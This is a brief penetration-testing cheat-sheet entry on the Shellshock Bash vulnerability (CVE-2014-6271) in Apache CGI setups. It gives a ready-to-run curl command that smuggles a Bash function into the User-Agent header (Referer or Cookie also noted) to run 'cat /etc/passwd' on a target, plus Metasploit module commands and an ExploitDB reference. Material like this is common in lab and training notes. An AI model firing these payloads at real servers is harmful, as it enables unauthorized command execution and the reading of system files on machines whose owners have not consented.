**Shellshock** (identified as **CVE-2014-6271**) is a critical vulnerability in the **GNU Bash** shell that allows remote attackers to execute arbitrary code via crafted environment variables.  The most common and dangerous attack vector involves **Apache** web servers using the **mod_cgi** or **mod_cgid** modules to execute scripts located in the **/cgi-bin/** directory.

Manual Exploitation (can also be used in Referer or Cookie)
```
curl -H "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'" http://target-ip/cgi-bin/vulnerable.sh   
```

Metasploit
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target-ip
set TARGETURI /cgi-bin/vulnerable.sh
exploit   
```

ExploitDB:
```
https://www.exploit-db.com/exploits/34900
```



### Files:
* `.htaccess` -> configure access on a directory-level
* `/etc/apache2/sites-enabled/000-default.conf` -> VHost config